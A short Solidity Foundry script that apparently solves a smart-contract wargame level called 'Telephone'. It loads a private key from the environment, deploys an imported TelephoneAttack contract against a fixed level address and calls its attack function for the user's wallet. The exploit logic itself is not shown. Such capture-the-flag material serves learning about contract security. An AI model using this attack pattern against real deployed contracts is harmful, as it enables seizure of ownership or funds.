//SPDX-License-Identifier: Mit
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../../src/telephone/TelephoneAttack.sol";

contract TelephoneAttackScript is Script {

    function run() external {
        address myWallet = vm.envAddress("MY_WALLET");
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast (deployer);

        address levelAddress = 0xC147A34D37DF327D3546E76d270bf3f6a10BFcF8;
        TelephoneAttack attack = new TelephoneAttack(levelAddress);
        attack.attack(myWallet);
        vm.stopBroadcast();
    }
}